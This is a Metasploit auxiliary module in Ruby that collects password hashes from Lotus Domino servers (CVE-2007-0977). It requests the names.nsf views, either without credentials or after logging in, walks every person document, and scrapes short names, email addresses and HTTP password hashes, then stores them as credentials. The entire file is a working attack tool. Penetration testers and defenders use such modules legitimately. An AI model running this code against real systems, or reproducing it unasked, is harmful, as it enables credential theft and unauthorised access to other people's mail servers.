##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Lotus Domino Password Hash Collector',
      'Description'    => 'Get users passwords hashes from names.nsf page',
      'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE' , '2007-0977']
        ]
    )

  register_options(
    [
      OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
      OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
      OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf'])
    ])
  end

  def post_auth?
    true
  end

  def run_host(ip)
    user = datastore['NOTES_USER']
    pass = datastore['NOTES_PASS']
    @uri = normalize_uri(datastore['URI'])

    if user.eql?('') && pass.eql?('')
      print_status("#{peer} - Lotus Domino - Trying dump password hashes without credentials")

      begin
        res = send_request_raw({
          'method'  => 'GET',
          'uri'     => "#{@uri}\/$defaultview?Readviewentries",
        }, 25)

        if res.nil?
          print_error('Connection failed')
          return
        end

        if res && res.body.to_s =~ /\<viewentries/
          print_good("#{peer} - Lotus Domino - OK names.nsf accessible without credentials")
          cookie = ''
          get_views(cookie, @uri)

        elsif res && res.body.to_s =~ /names.nsf\?Login/
          print_error("#{peer} - Lotus Domino - The remote server requires authentication")
          return :abort

        else
          print_error("#{peer} - Lotus Domino - Unrecognized #{res.code} response")
          vprint_error(res.to_s)
          return :abort

        end

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
      end

    else
      print_status("#{peer} - Lotus Domino - Trying dump password hashes with given credentials")
      do_login(user, pass)
    end
  end

  def do_login(user = nil, pass = nil)
    post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"

    begin

      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/names.nsf?Login',
        'data'    => post_data
      }, 20)

      if res.nil?
        print_error("#{peer} - Connection timed out")
        return
      end

      if res && res.code == 302
        if res.get_cookies =~ /DomAuthSessId=(.*);(.*)/i
          cookie = "DomAuthSessId=#{$1}"
        elsif res.get_cookies =~ /LtpaToken=(.*);(.*)/i
          cookie = "LtpaToken=#{$1}"
        else
          print_error("#{peer} - Lotus Domino - Unrecognized 302 response")
          return :abort
        end
        print_good("#{peer} - Lotus Domino - SUCCESSFUL authentication for '#{user}'")
        print_status("#{peer} - Lotus Domino - Getting password hashes")
        get_views(cookie, @uri)

      elsif res && res.body.to_s =~ /names.nsf\?Login/
        print_error("#{peer} - Lotus Domino - Authentication error: failed to login as '#{user}'")
        return :abort

      else
        print_error("#{peer} - Lotus Domino - Unrecognized #{res.code} response")
        return :abort
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

  def get_views(cookie, uri)
    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => "#{uri}\/$defaultview?Readviewentries",
        'cookie'  => cookie
      }, 25)
      if res && res.body
        max = res.body.scan(/siblings=\"(.*)\"/).first.join

        1.upto(max.to_i) do |i|
          res = send_request_raw({
            'method'  => 'GET',
            'uri'     => "#{uri}\/$defaultview?Readviewentries&Start=#{i}",
            'cookie'  => cookie
          }, 25)

          view_id = res.body.scan(/unid="([^\s]+)"/)[0].join
          dump_hashes(view_id, cookie, uri)
        end

      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

  def dump_hashes(view_id, cookie, uri)
    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => "#{uri}\/$defaultview/#{view_id}?OpenDocument",
        'cookie'  => cookie
      }, 25)

      if res && res.body
        short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
        user_mail = res.body.scan(/<INPUT NAME=\"InternetAddress\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
        pass_hash = res.body.scan(/<INPUT NAME=\"\$?dspHTTPPassword\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join

        short_name = 'NULL' if short_name.to_s.strip.empty?
        user_mail = 'NULL' if user_mail.to_s.strip.empty?
        pass_hash = 'NULL' if pass_hash.to_s.strip.empty?

        print_good("#{peer} - Lotus Domino - Account Found: #{short_name}, #{user_mail}, #{pass_hash}")

        if pass_hash != 'NULL'
          domino_svc = report_service(
            :host => rhost,
            :port => rport,
            :name => (ssl ? 'https' : 'http')
          )
          report_auth_info(
            :host        => rhost,
            :port        => rport,
            :sname       => (ssl ? 'https' : 'http'),
            :user        => short_name,
            :pass        => pass_hash,
            :ptype       => 'domino_hash',
            :source_id   => domino_svc.id,
            :source_type => 'service',
            :proof       => "WEBAPP=\"Lotus Domino\", USER_MAIL=#{user_mail}, HASH=#{pass_hash}, VHOST=#{vhost}",
            :active      => true
          )
        end
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
